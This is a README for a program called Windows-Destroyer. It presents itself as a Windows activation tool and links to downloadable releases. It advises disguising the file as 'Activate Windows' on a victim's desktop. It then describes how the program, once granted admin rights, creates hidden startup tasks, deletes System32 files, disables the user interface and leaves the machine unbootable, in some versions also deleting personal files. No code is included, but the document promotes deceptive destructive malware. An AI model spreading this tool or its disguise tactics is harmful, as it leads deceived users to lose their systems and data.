# Windows Activation
A program that masquerades as an activation tool to completely destroy a system.

# How does it work?
In the [Releases](https://github.com/MarcBeast/Windows-Destroyer/releases) page you can download the latest version as .exe
This .exe was created with the Windows iexpress tool and unpacks the Windows destroyer.

Now you can run the "Run Me!" file, you can also rename it or create shortcuts to it disguised as "Activate Windows" or similar on the desktop, but it must not be moved or copied, but no other files must be renamed or deleted.

# What will happen?
Once the "Run Me!" file has been executed and the UAC has been confirmed as admin, some important files have already been created, when you get to the engine and get to the "Initialization" tasks are created for Windows that are activated at system startup or when a user logs in. These tasks open .bat files with system right which means it is invisible and cannot be stopped, thereby important files in System32 are deleted which does not let Windows boot any more, what one will notice most is that Explorer.exe cannot be executed any more - means no user interface any more except a constant pop-up with: "This PC cannot be used any more". If the PC is now restarted, it can no longer boot.

# Is it possible to save the PC?
Windows itself cannot be repaired, which means that you have to attach the hard disk to another PC to save your files. Some personal files can be deletet in this version
if you want to keep personal files use the german [v.2.7](https://github.com/MarcBeast/Windows-Destroyer/releases/tag/v.2.7)

Windows must then be reinstalled. Other hard drives are not affected by the tool.
